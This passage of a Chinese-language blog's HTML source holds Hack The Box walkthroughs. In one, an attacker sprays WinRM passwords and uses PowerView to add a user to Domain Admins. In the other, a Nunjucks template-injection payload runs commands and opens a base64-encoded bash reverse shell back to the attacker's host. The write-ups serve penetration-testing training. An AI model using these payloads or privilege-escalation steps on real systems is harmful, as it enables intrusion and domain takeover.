Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br>d<span class="hljs-literal">---s-</span>       <span class="hljs-number">10</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">3</span>:<span class="hljs-number">13</span> AM                Microsoft<br>d<span class="hljs-literal">-----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">12</span>:<span class="hljs-number">05</span> AM                regid.<span class="hljs-number">1991</span><span class="hljs-literal">-06</span>.com.microsoft<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                SoftwareDistribution<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">48</span> AM                ssh<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">10</span>:<span class="hljs-number">49</span> AM                USOPrivate<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">10</span>:<span class="hljs-number">49</span> AM                USOShared<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">8</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">2</span>:<span class="hljs-number">57</span> AM                VMware<br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">5</span>:<span class="hljs-number">04</span> AM            <span class="hljs-number">830</span> dir.txt<br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">5</span>:<span class="hljs-number">03</span> AM            <span class="hljs-number">108</span> login.ps1<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">type</span> dir.txt<br><br><br>    Directory: C:\Users\maria\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-a----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">8</span>:<span class="hljs-number">13</span> AM           <span class="hljs-number">6144</span> Engines.xls<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <br></code></pre></td></tr></table></figure><p>maria用户的桌面有一个excel文件，我可以利用同样的方法将它拷贝过来：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;copy \users\maria\desktop\Engines.xls \programdata\&quot;</span> &gt; login.ps1<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\programdata<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br>d<span class="hljs-literal">---s-</span>       <span class="hljs-number">10</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">3</span>:<span class="hljs-number">13</span> AM                Microsoft<br>d<span class="hljs-literal">-----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">12</span>:<span class="hljs-number">05</span> AM                regid.<span class="hljs-number">1991</span><span class="hljs-literal">-06</span>.com.microsoft<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                SoftwareDistribution<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">48</span> AM                ssh<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">10</span>:<span class="hljs-number">49</span> AM                USOPrivate<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">10</span>:<span class="hljs-number">49</span> AM                USOShared<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">8</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">2</span>:<span class="hljs-number">57</span> AM                VMware<br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">5</span>:<span class="hljs-number">06</span> AM            <span class="hljs-number">830</span> dir.txt<br><span class="hljs-literal">-a----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">8</span>:<span class="hljs-number">13</span> AM           <span class="hljs-number">6144</span> Engines.xls<br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">5</span>:<span class="hljs-number">06</span> AM            <span class="hljs-number">108</span> login.ps1<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; download C:\programdata\Engines.xls Engines.xls<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520210956271.png" alt="image-20220520210956271"  /><p>我获得了maria的三个密码，</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> crackmapexec winrm <span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span> <span class="hljs-literal">-u</span> maria <span class="hljs-literal">-p</span> passwd.txt       <br> <br>[*] completed: <span class="hljs-number">100.00</span>% (<span class="hljs-number">1</span>/<span class="hljs-number">1</span>)<br><br>[*] completed: <span class="hljs-number">100.00</span>% (<span class="hljs-number">1</span>/<span class="hljs-number">1</span>)<br>SMB         <span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span>    <span class="hljs-number">5985</span>   NONE             <span class="hljs-function">[*] <span class="hljs-title">None</span></span> (name:<span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span>) (domain:None)<br>HTTP        <span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span>    <span class="hljs-number">5985</span>   NONE             [*] http://<span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span>:<span class="hljs-number">5985</span>/wsman<br>WINRM       <span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span>    <span class="hljs-number">5985</span>   NONE             [-] None\maria:d34gb8<span class="hljs-selector-tag">@</span><br>WINRM       <span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span>    <span class="hljs-number">5985</span>   NONE             [-] None\maria:<span class="hljs-number">0</span>de_434_d545<br>WINRM       <span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span>    <span class="hljs-number">5985</span>   NONE             [+] None\maria:W3llcr4ft3d_4<span class="hljs-built_in">cls</span> (Pwn3d!)<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span> <span class="hljs-literal">-u</span> maria <span class="hljs-literal">-p</span> W3llcr4ft3d_4<span class="hljs-built_in">cls</span><br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">3</span><br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><br><span class="hljs-keyword">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil<span class="hljs-literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="hljs-literal">-winrm</span><span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\maria\Documents&gt; <br></code></pre></td></tr></table></figure><p>maria用户对域管理组有改写权限，可以将域管理组对象的所有者设置为maria：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">Set-DomainObjectOwner</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-OwnerIdentity</span> maria<br></code></pre></td></tr></table></figure><p>作为所有者，maria 可以赋予 maria 对该组的全部权限：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">Add-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-PrincipalIdentity</span> maria <span class="hljs-literal">-Rights</span> All<br></code></pre></td></tr></table></figure><p>然后将maria添加进管理组：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\maria\Documents&gt; <span class="hljs-built_in">Add-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&#x27;Domain Admins&#x27;</span> <span class="hljs-literal">-Members</span> <span class="hljs-string">&#x27;maria&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\maria\Documents&gt; net user maria<br>User name                    maria<br>Full Name                    maria garcia<br>Comment<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country/region code          000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            10/21/2021 9:16:32 PM</span><br><span class="hljs-string">Password expires             Never</span><br><span class="hljs-string">Password changeable          10/22/2021 9:16:32 PM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     Yes</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script                 C:\\programdata\\login.ps1</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory</span><br><span class="hljs-string">Last logon                   5/20/2022 5:17:43 AM</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *Remote Management Use</span><br><span class="hljs-string">Global Group memberships     *Domain Admins        *Domain Users</span><br><span class="hljs-string">The command completed successfully.</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>现在我需要重新登录maria使更改生效：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\users\administrator&gt; <span class="hljs-built_in">cd</span> desktop<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\users\administrator\desktop&gt; <span class="hljs-built_in">type</span> root.txt<br><span class="hljs-number">84</span>........................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Nunchucks</title>
    <link href="/post/HackTheBox-Nunchucks.html"/>
    <url>/post/HackTheBox-Nunchucks.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><h5 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan:"></a>Masscan:</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.122 --rate 2000 -e tun0<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-15 05:12:50 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.11.122                                    <br>Discovered open port 443/tcp on 10.10.11.122 <br></code></pre></td></tr></table></figure><h5 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 13:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.122<br>Host is up (0.19s latency).<br><br>PORT    STATE SERVICE  VERSION<br>80/tcp  open  http     nginx 1.18.0 (Ubuntu)<br>|_http-title: Did not follow redirect to https://nunchucks.htb/<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)<br>| tls-nextprotoneg: <br>|_  http/1.1<br>|_http-title: Nunchucks - Landing Page<br>| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK<br>| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb<br>| Not valid before: 2021-08-30T15:42:24<br>|_Not valid after:  2031-08-28T15:42:24<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>| tls-alpn: <br>|_  http/1.1<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 34.75 seconds<br></code></pre></td></tr></table></figure><p>80端口做了重定向：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515131733818.png" alt="image-20220515131733818"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb https://nunchucks.htb/                                 <br>https://nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]<br></code></pre></td></tr></table></figure><p>一个网上店铺应用程序：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132405611.png" alt="image-20220515132405611"  /><p>尽管按钮很多，但是需要我先注册：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132057143.png" alt="image-20220515132057143"  /><p>如果需要枚举用户名的话，这里应该会是个好地方。好吧，注册已关闭：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132718905.png" alt="image-20220515132718905"  /><p>登录也被禁止了：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132757847.png" alt="image-20220515132757847"  /><p>还是后端检测：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132932366.png" alt="image-20220515132932366"  /><p>注册页面也是后端检验：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515133139761.png" alt="image-20220515133139761"  /><p>或许我可以破坏掉json数据看后端会不会对其进行校验，确实如此：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515133318066.png" alt="image-20220515133318066"  /><p>我得到了绝对路径，但暂时不知道用来做什么，尝试收集目录信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[13:36:34] Starting: <br>[13:37:19] 301 -  179B  - /assets  -&gt;  /assets/<br>[13:37:43] 200 -    9KB - /login<br>[13:37:43] 200 -    9KB - /login/<br>[13:37:56] 200 -   19KB - /privacy<br>[13:38:00] 400 -    1KB - /servlet/%C0%AE%C0%AE%C0%AF<br>[13:38:02] 200 -    9KB - /signup<br>[13:38:06] 200 -   17KB - /terms<br></code></pre></td></tr></table></figure><p>像是个目录遍历，不过想多了，没什么薄弱点啊，或许我可以尝试扫一遍子域名 ，–hh过滤30587，要不会被无效信息刷屏：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">000000035:   200        546 L    2271 W     30587 Ch    <span class="hljs-string">&quot;cp&quot;</span>                                                 <br>000000032:   200        546 L    2271 W     30587 Ch    <span class="hljs-string">&quot;mysql&quot;</span>                                              <br>000000034:   200        546 L    2271 W     30587 Ch    <span class="hljs-string">&quot;support&quot;</span>                                            <br>000000051:   200        546 L    2271 W     30587 Ch    <span class="hljs-string">&quot;api&quot;</span>                                                <br>000000053:   200        546 L    2271 W     30587 Ch    <span class="hljs-string">&quot;images&quot;</span>                                             <br>000000057:   200        546 L    2271 W     30587 Ch    <span class="hljs-string">&quot;sql&quot;</span>                                                <br>000000065:   200        546 L    2271 W     30587 Ch    <span class="hljs-string">&quot;mx1&quot;</span>                                                <br>000000081:   200        101 L    259 W      4028 Ch     <span class="hljs-string">&quot;store&quot;</span>                                              <br>^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...<br><br>Total time: 4.781369<br>Processed Requests: 55<br>Filtered Requests: 0<br>Requests/sec.: 11.50298<br><br>                                                                                                                      <br>&gt;&gt; wfuzz -H <span class="hljs-string">&quot;Host: FUZZ.nunchucks.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb <br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: https://nunchucks.htb/</span><br><span class="hljs-string">Total requests: 4989</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload                                              </span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000081:   200        101 L    259 W      4028 Ch     &quot;store&quot; </span><br></code></pre></td></tr></table></figure><p>可以捕获到另一个子域名：store.nunchucks.htb.</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515135516895.png" alt="image-20220515135516895"  /><p>都是假按钮，除了邮箱：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515135631811.png" alt="image-20220515135631811"  /><p>有输入有回显，我尝试了模板注入，确实是这样：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515135913013.png" alt="image-20220515135913013"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515140130904.png" alt="image-20220515140130904"  /><p>这就要搜了，Express框架会使用什么引擎：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515140219138.png" alt="image-20220515140219138"  /><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>disse.cting.org<span class="hljs-regexp">/2016/</span><span class="hljs-number">08</span><span class="hljs-regexp">/02/</span><span class="hljs-number">2016</span>-<span class="hljs-number">08</span>-<span class="hljs-number">02</span>-sandbox-<span class="hljs-keyword">break</span>-out-nunjucks-template-engine<br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">admin</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">range.constructor</span>(\<span class="hljs-name">&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;tail /etc/passwd&#x27;)\&quot;</span>)()&#125;&#125;</span><span class="language-xml">@htb.com</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515140928466.png" alt="image-20220515140928466"  /><p>当前用户admindavid：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515141055256.png" alt="image-20220515141055256"  /><p>可以尝试反弹shell，直接输入命令会出错，需要进行编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.5/9001 0&gt;&amp;1&#x27;</span> | <span class="hljs-built_in">base64</span><br>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzkwMDEgMD4mMQo=<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/submit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>store.nunchucks.htb<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>_csrf=m1BsKNRC2A1TPi8qnMCZ9cH9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://store.nunchucks.htb/<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://store.nunchucks.htb<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>162<br><span class="hljs-attribute">Dnt</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Te</span><span class="hljs-punctuation">: </span>trailers<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-autoit">&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;admin&#123;&#123;range.constructor(\&quot;</span><span class="hljs-keyword">return</span> <span class="hljs-keyword">global</span>.process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzkwMDEgMD4mMQo=|base64 -d|bash&#x27;</span>)\<span class="hljs-string">&quot;)()&#125;&#125;@htb.com&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.5] from (UNKNOWN) [10.10.11.122] 38086<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1009): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>david@nunchucks:/var/www/store.nunchucks$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>david@nunchucks:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>david@nunchucks:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>9387541bc650fb976956afbc2506e8ca<br></code></pre></td></tr></table></figure><p>sudo -l 需要密码，而我没有：</p><figure class="highlight bash"><table><tr><td 